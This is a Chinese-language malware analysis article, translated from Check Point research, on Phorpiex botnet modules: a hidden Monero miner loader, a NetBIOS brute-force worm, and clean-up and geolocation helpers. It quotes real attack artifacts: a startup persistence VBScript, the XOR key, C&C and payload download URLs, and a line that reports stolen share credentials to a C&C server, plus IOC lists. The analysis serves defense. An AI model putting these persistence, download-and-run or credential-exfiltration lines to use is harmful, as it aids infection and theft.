**Phorpiex僵尸网络中有超过1,000,000台被感染的Windows计算机。在[《Phorpiex僵尸网络技术分析（一）》](https://www.freebuf.com/articles/network/230546.html)中分析了Phorpiex
Tldr和VNC Worm两个模块，本文将分析另外三个模块：XMRig Silent Loader、NetBIOS Worm
Module和Auxiliary modules。**

##  XMRig

该模块的主要目的是启动XMRig
monero矿机。门罗币（或XMR）是一种去中心化的加密货币，通过分布式共识确认，然后记录在区块链上。该加密货币对攻击者非常有吸引力，
Monero无法追踪，默认情况下混淆了发送和接收地址以及交易量。 Monero区块链上的交易不能链接到特定用户或真实世界的身份。

Monero采矿机是由XMRig的开源代码构成，是Phorpiex僵尸网络获利的有效载荷之一，被感染的计算机每月可产生约15,000美元的收入。攻击者将矿机植入受感染的计算机并运行，矿工本身及其参数使用简单的密码进行混淆，并嵌入到模块中。在执行之前，恶意软件会将参数解密并传递给矿工。

Phorpiex使用的XMRig与在[网上出售](https://xmrminer.net/)的相同，攻击者很可能是在网上购买的。

###
![](https://image.3001.net/images/20200317/1584447520_5e70c020b9d27.png!small)

###  加载流程

###
![](https://image.3001.net/images/20200317/1584447668_5e70c0b47b68e.png!small)初始化

为了防止运行多个XMRig，加载程序会创建具有硬编码名称的互斥。样本中的名称有所不同。 发现以下硬编码变体：

> 4b293105d7b102179b20
>
> bf73f1604fc0b6b3d70d

###  持久化

加载程序将自身复制到“ C：\ ProgramData \ {HardcodedFolder} \
{HardcodedExecutable}”。在不同样本中“ {HardcodedExecutable}”参数值：

> cfgmgr.exe
>
> windrv32.exe
>
> sysdrv32.exe

路径“ C：\ ProgramData \ {HardcodedFolder}”也用于存储临时文件，例如VB脚本和传递给矿工的配置。在不同的样本中“
{HardcodedFolder}”参数值：

> FeSdavbMaL
>
> ADwXcSSGvY

该恶意软件在启动文件夹中创建一个指向自我复制的链接：

> %APPDATA%\Microsoft\Windows\Start
> Menu\Programs\Startup\\{HardcodedFilename}.url

在不同的样本中“ {HardcodedFilename}”参数值：

> kBBcUBIbha
>
> LtHgNeMqRB

下图显示了启动文件夹中的链接以及可执行文件的路径：

![](https://image.3001.net/images/20200317/1584447942_5e70c1c617521.png!small)

加载程序会根据系统中是否存在以下防恶意软件进程来选择启动URL的方法：

> a2guard.exe
>
> a2service.exe
>
> a2start.exe

如果未检测到这些集成，则通过执行以下脚本创建启动链接：

![](https://image.3001.net/images/20200317/1584448016_5e70c21085409.png!small)

> Set objFSO=CreateObject("Scripting.FileSystemObject")
>
> outFile="C:\Users\Lab\AppData\Roaming\Microsoft\Windows\Start
> Menu\Programs\Startup\kBBcUBIbha.url"
>
> Set objFile = objFSO.CreateTextFile(outFile,True)
>
> objFile.Write "[InternetShortcut]" & vbCrLf &
> "URL=""file:///C:\ProgramData\FeSdavbMaL\cfgmgr.exe"""
>
> objFile.Close

如果VB脚本未能创建此启动配置，或者检测到上面列出的任何进程，则将使用WinAPI函数直接从加载程序中调用。该函数内部还有一个附加检查：是否正在运行任何反恶意软件进程。通常使用以下命令执行：

> cmd.exe / C WScript“ C：\ ProgramData \ FeSdavbMaL \ r.vbs”

如果遇到以下任何过程，则使用线程注入（请参阅线程注入部分）代替直接的“ cmd”调用：

> bdagent.exe
>
> vsserv.exe
>
> cfp.exe
>
> ccavsrv.exe
>
> cmdagent.exe
>
> avp.exe
>
> avpui.exe
>
> ksde.exe

对于x86，加载程序将搜索explorer.exe。对于x64，将枚举所有进程，但是将忽略这两个进程：

> csrss.exe
>
> winlogon.exe

下图总结了以上所有内容：

![](https://image.3001.net/images/20200317/1584448201_5e70c2c9c4312.png!small)

###  加密

加载程序配置值和XMRig Miner有效负载使用XOR加密。 解密密钥“ 0125789244697858”被硬编码到二进制文件中。 解密后：

> C&C server URL to contact : [http://185.176.27](https://www.freebuf.com/wp-> admin/post.php?post=230724&action=edit)[.]132/update.txt
>
> XMR crypto-wallet (re-written by the user ID but used directly in other
> Phorpiex modules):
>
>
> 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQujt72bSgzs7j6uNDV
>
> Mining pool : 176.27.132:4545

###  加载程序

矿工可执行文件使用硬编码的XOR密钥解密：

![](https://image.3001.net/images/20200317/1584449669_5e70c885c600b.png!small)

矿工从“ C：\ Windows \ System32”目录（即wuapp.exe）注入到新创建进程的地址空间中。
在执行期间，加载程序将检查taskmgr.exe的状态。
如果检测到任务管理器正在运行，加载程序终止矿工并循环挂起，直到任务管理器不再运行。未检测到taskmgr.exe时，矿工将再次启动。

下图显示了其外观：

###
![](https://image.3001.net/images/20200317/1584449796_5e70c9047c239.png!small)注入细节

注入过程最特殊之处是函数的调用方式。加载程序映射自己的ntdll.dll副本，搜索必要的函数，对这些函数进行内部数组指针处理，然后再调用它们。ntdll.dll的地址是通过PEB获得的：

![](https://image.3001.net/images/20200317/1584449866_5e70c94a56bcb.png!small)ESI中有ntdll.dll地址：

> ESI 777A000 ntdll.777A000

###  矿工配置

加载程序将配置保存到“ C：\ ProgramData \ {HardcodedFolder} \ cfg”，并将其作为命令行参数传递给Miner。
配置具有以下结构：

    
    
    {
    	"algo": "cryptonight",
    	"autosave": false,
    	"background": false,
    	"colors": true,
    	"retries": 5,
    	"retry-pause": 5,
    	"syslog": false,
    	"print-time": 60,
    	"av": 0,
    	"safe": false,
    	"cpu-priority": null,
    	"cpu-affinity": null,
    	"donate-level": 0,
    	"threads": 1,
    	"pools": [
    		{
    			"url": "185.176.27.132:4545",
    			"user": "ea7c252d-5590-4983-995d-02a1a35bb966",
    			"pass": "x",
    			"keepalive": false,
    			"nicehash": false,
    			"variant": "r",
    			"tls": false,
    			"tls-fingerprint": null
    		}
    	],
    	"api": {
    		"port": 0,
    		"access-token": null,
    		"worker-id": null
    	}
    }

在研究的样本中，所有的配置值都为硬编码的，“线程”值等于系统中处理器的数量。

###  未使用的信息

在加载程序执行期间，发现了内存中存在的XMR钱包。 不同的样本可能包含不同的钱包。

>
> 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQujt72bSgzs7j6uNDV
>
>
> 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQoMMyaX2Eun2XCgFYq

分析此模块中XMR钱包的用途，检查了应该使用钱包地址的地方，发现已经使用用户ID进行了重写，然后进行配置：

![](https://image.3001.net/images/20200317/1584450093_5e70ca2da96bc.png!small)

###  网络通信

XMRig Loader检查C＆C服务器上是否有新指令，并执行找到的指令。 此通信执行两次：在矿工注入之前和之后，
使用不加密的HTTP协议。相应的字段中的值：

###
![](https://image.3001.net/images/20200317/1584450263_5e70cad78ac24.png!small)支持命令

下面是从C＆C服务器发送命令时使用的格式（保留了原始注释）：

    
    
    [Miner]
    address=YOUR_XMR_ADDRES ; XMR address, email (minergate), btc address (nicehash), etc.
    poolport=pool.minexmr.com:4444 ; Do not include 'stratum+tcp://' e.g monerohash.com:3333
    password=x ; Pool password
    stop=0 ; Change this value to "1" to stop miner. If not specified or equal to "0" miner will work.
    proxy=0 ; Change this value to "1" if you are mining to xmrig-proxy instead of pool. This enables using a unqiue address per worker for better miner monitoring.
    keepalive=0 ; 0 to disable keepalive, 1 to enable keepalive
    
    [Update]
    ;config_url=http://xmrminer.net/config.txt ; You can update the url that points to the configuration file. Must begin with "http://" or "https://"
    knock_time=30 ; Number of minutes the miner waits between visits to config file. If never specified, default is 30 minutes.
    ;update_url=http://mysite.com/new_miner ; url of new miner. Miner will get updated with this file.
    ;update_hash=xxxxxxxxxx ; md5 hash of new miner file. 32 characters long (16 byte hexadecimal format for hash). You need to specify this value, othewise miner will not get updated!
    
    ;End of configuration. Do not remove this line, ";End" string specifies end of configuration file.
    
    ;Everything after a ";" character is a comment, so it is ignored by the miner when parsing the configuration. Only the ";" character is used for this purpose.
    ;Always include the appropriate options below the defined "[Miner]" and "[Update]" sections. If you do not include the section names it won't work.
    ;Make sure everything is spelled correctly
    ;If you specify "config_url" double check it is correctly spelled, otherwise the miner that reads an incorrect url will never go back to a correct url (i.e. last configuration will be locked).

Miner update

![](https://image.3001.net/images/20200317/1584450370_5e70cb42e599f.png!small)Miner
stop

![](https://image.3001.net/images/20200317/1584450392_5e70cb586f572.png!small)服务器可能会请求其他文件名：

> c.txt
>
> upd.txt
>
> newup.txt
>
> update.txt
>
> xmrupdate.txt

##  Phorpiex NetBIOS Worm模块

该模块是自我传播的蠕虫，还有下载其他有效负载的功能。NetBIOS蠕虫会扫描随机IP地址查找开放的139
TCP端口（NetBIOS），使用用户名和密码的硬编码列表进行暴力攻击。攻击使用rand函数随机生成用于扫描的IP地址，将GetTickCount结果作为随机种子。
IP地址滤规则是不能以127、172或192开头。NetBIOS蠕虫创建带有硬编码名称的互斥锁防止多次执行。创建单独线程与每个IP地址进行通信，扫描功能与Phorpiex
VNC蠕虫模块中的扫描功能非常相似。

如果它是由Phorpiex Tldr加载的，使用伪随机名称保存该模块。在自我传播阶段，恶意软件会使用“
WindowsDefender.exe”上传自身。在这种情况下，NetBIOS蠕虫必须下载Phorpiex主模块或其他有效负载。恶意软件通过调用GetModuleFilename获取其文件名。如果名称为“
WindowsDefender.exe”，它将尝试从硬编码的URL下载并执行文件：

![](https://image.3001.net/images/20200317/1584450664_5e70cc68ce3bd.png!small)不同样本中的URL:

> hxxp://92.63.197.153/NB.exe
>
> hxxp://92.63.197.153/nb.exe
>
> hxxp://193.32.161.77/CRAZYBLAYNE.exe
>
> hxxp://92.63.197.153/enum.exe
>
> hxxp://193.32.161.77/enum.exe
>
> hxxp://193.32.161.77/aldenta.exe

最后无限循环网络扫描。 对于每个随机生成的IP地址，NetBIOS模块都会启动一个线程，检查139 TCP端口是否在进行侦听。
成功连接后，NetBIOS蠕虫会尝试通过调用NetShareEnum API函数来枚举网络共享。

![](https://image.3001.net/images/20200317/1584450769_5e70ccd1a67dc.png!small)Phorpiex
NetBIOS蠕虫会尝试使用用户名和密码的硬编码列表连接到网络共享：

![](https://image.3001.net/images/20200317/1584450798_5e70ccee0ab83.png!small)成功连接到网络资源后，恶意软件会尝试将自身复制到以下位置：

> WindowsDefender.exe
>
> WINDOWS\All Users\StartMenu\Programs\Startup\WindowsDefender.exe
>
> WINDOWS\StartMenu\Programs\Startup\WindowsDefender.exe
>
> WINNT\Profiles\All Users\StartMenu\Programs\Startup\WindowsDefender.exe
>
> ProgramData\Microsoft\Windows\Start
> Menu\Programs\StartUp\WindowsDefender.exe
>
> Users\All Users\Microsoft\Windows\Start Menu\Programs\WindowsDefender.exe
>
> Documents and Settings\All
> Users\StartMenu\Programs\Startup\WindowsDefender.exe

![](https://image.3001.net/images/20200317/1584450839_5e70cd17a4432.png!small)

目标路径指向启动文件夹确保其在目标系统中的持久性。最后一步是在目标主机上调用上传功能，有两种方式执行：

**在远程主机上创建新服务** 。恶意软件使用“ NetBIOS Windows
Defender”，为创建的服务设置值SERVICE_WIN32_SHARE_PROCESS，并以SERVICE_AUTO_START作为启动类型。

**在远程主机上计划任务** 。预定时间为当前时间120秒。恶意软件通过NetRemoteTOD API函数来获取时间，并针对特定时区进行更正。

操作成功后使用简单HTTP请求，向C＆C服务器报告：

> snwprintf(url, L"hxxp://92.63.197.153/e.php?srv=%ls|%ls|%ls|%ls",
> NetLocation, UserName, Password, Message);

HTTP请求的用户代理：

> Mozilla / 5.0（Macintosh; Intel Mac OS X 10.9; rv：25.0）Gecko / 20100101
> Firefox / 25.0

该恶意软件可以发送以下消息：

![](https://image.3001.net/images/20200317/1584451093_5e70ce15b9efa.png!small)其他样本中的信息：

![](https://image.3001.net/images/20200317/1584451125_5e70ce3558a24.png!small)在各种样本中发现的URL：

> hxxp://193.32.161.77/nb.php?srv=
>
> hxxp://193.32.161.77/exec.php?srv=
>
> hxxp://193.32.161.77/nn.php?srv=
>
> hxxp://193.32.161.77/gud.php?srv=
>
> hxxp://193.32.161.77/go.php?srv=
>
> hxxp://193.32.161.77/netb.php?srv=
>
> hxxp://193.32.161.77/ok.php?srv=
>
> hxxp://92.63.197.153/e.php?srv=
>
> hxxp://92.63.197.153/huh.php?srv=
>
> hxxp://92.63.197.153/nb.php?srv=
>
> hxxp://92.63.197.153/tst.php?srv=
>
> hxxp://92.63.197.153/ya.php?nb=

##  Auxiliary模块

Phorpiex非常通用。 主模块接收到“命令”队列，每个命令都是一个单独的可执行模块。 还观察到了功能非常有限的微型模块的许多不同变体。
Phorpiex加载的此类小型可执行文件，例如Clean-Up模块。 它包含2个函数，目的是终止具有指定硬编码名称的进程并删除多个注册表项。

清理模块终止的进程列表包括：

> winsrvc32.exe
>
> winupsvcmgr.exe
>
> winsvcinstl.exe
>
> winupd32svc.exe
>
> wincfg32svc.exe
>
> windrv.exe
>
> wincfgrmg***.exe
>
> winmgr.exe
>
> wincfg.exe
>
> wincfg32.exe
>
> winupd.exe
>
> winupd32.exe
>
> winsvcin32.exe
>
> winupd32cfg.exe
>
> winmg***cfg.exe
>
> csrssc.exe
>
> csrsscxn.exe
>
> winsecmgr.exe
>
> winsecmgrv.exe
>
> windrvmg***.exe

清理模块还从注册表项“ HKLM \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Run
\”中删除以下值：

> WinCfgMgr
>
> Windows Update Service Manager
>
> Microsoft Windows Update Services
>
> Microsoft Update 495036
>
> Microsoft Windows Service Installer
>
> Microsoft Windows Driver Configuration
>
> Microsoft Windows Installer Svc
>
> Windows Security Manager

该模块禁用过时的Phorpiex模块，例如Phorpiex Trik：

![](https://image.3001.net/images/20200317/1584451395_5e70cf4326f22.png!small)另一种小型可执行文件类型是地理位置定位。
它使用服务api.wipmania.com确定受感染计算机的位置。 如果在白名单中，恶意软件会从硬编码的URL下载有效负载：

![](https://image.3001.net/images/20200317/1584451450_5e70cf7a691ef.png!small)

2019年初发现针对中国和越南的加载程序，根据位置信息将GandCrab勒索软件的不同变体加载到受感染的计算机上。

##  总结

Phorpiex是一个非常特殊的恶意软件家族，其功能包括各种不同的模块，每个功能模块都承担着专门的任务：发送垃圾邮件，感染蠕虫等等。如果需要新功能，则引入新模块，无需重建或重新配置现有模块。这种方法不易出错，耗时少，为恶意软件开发人员节省了大量精力。

迄今为止，Phorpiex已感染了超过一百万台计算机，并创造了可观的利润。我们所能看到和估计的只是冰山一角。在Phorpiex家族中的Raccoon
Stealer和Predator the Thief还有更多自己独特的方法来进行恶意活动。

##  IOC

###  XMRig Silent Loader

![](https://image.3001.net/images/20200317/1584451675_5e70d05baa51e.png!small)Mutex
names

> 0fe420b0eb8396a48280
>
> 3f3ff4de39fc87f8152a
>
> 4b293105d7b102179b20
>
> 5d6eb4d965fd09330511
>
> a6c92143cac02de51d4a
>
> bf73f1604fc0b6b3d70d
>
> ff9702c705fd434610c0

Strings

> 0125789244697858
>
> f23e1993dfdXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
>
> objFile.Write “[InternetShortcut]” & vbCrLf & “URL=””file:///

###  Phorpiex NetBIOS Worm Module

![](https://image.3001.net/images/20200317/1584451733_5e70d0958bedf.png!small)URLs

> hxxp://92.63.197.153/NB.exe
>
> hxxp://92.63.197.153/nb.exe
>
> hxxp://193.32.161.77/CRAZYBLAYNE.exe
>
> hxxp://92.63.197.153/enum.exe
>
> hxxp://193.32.161.77/enum.exe
>
> hxxp://193.32.161.77/aldenta.exe

###  Auxiliary modules

![](https://image.3001.net/images/20200317/1584451774_5e70d0bed2efe.png!small)URLs

> <http://92.63.197.153/KrabGEO.exe>
>
> <http://92.63.197.153/KrabLang.exe>
>
> <http://193.32.161.77/stl.exe>
>
> <http://185.176.27.132/inf/n.exe>
>
> <http://185.176.27.132/p.exe>

***参考来源：[checkpoint](https://research.checkpoint.com/2020/phorpiex-arsenal-part-ii/)，由Kriston编译，转载请注明来自FreeBuf.COM**

  

